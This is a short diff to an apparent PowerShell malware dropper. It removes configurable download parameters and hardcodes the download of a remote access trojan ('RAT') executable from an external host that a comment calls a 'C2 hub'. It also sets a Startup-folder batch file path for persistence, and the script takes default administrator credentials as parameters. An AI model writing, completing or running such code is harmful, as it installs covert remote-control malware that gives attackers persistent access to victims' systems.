@@ -6,8 +6,6 @@
 param(
   [String]$defAdminUsr, 
   [String]$defAdminPwd,
-  [String]$localpath,
-  [String]$downloadlink,
   [String]$hostname
 )
 
@@ -17,7 +15,8 @@ param(
 ###
 
 # Static URLs to download RAT and static download locat
-$raturl = $downloadlink
+# CAUTION - C2 HUB MOST BE ONLINE AS THIS IS A STATIC DOWNLOAD OPERATION! <to be adjusted in future updates>
+$raturl = "http://north2.hub.envar.io/vault76kg/drvfrw.exe"
 $startup = "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\runadm.bat"
 
 
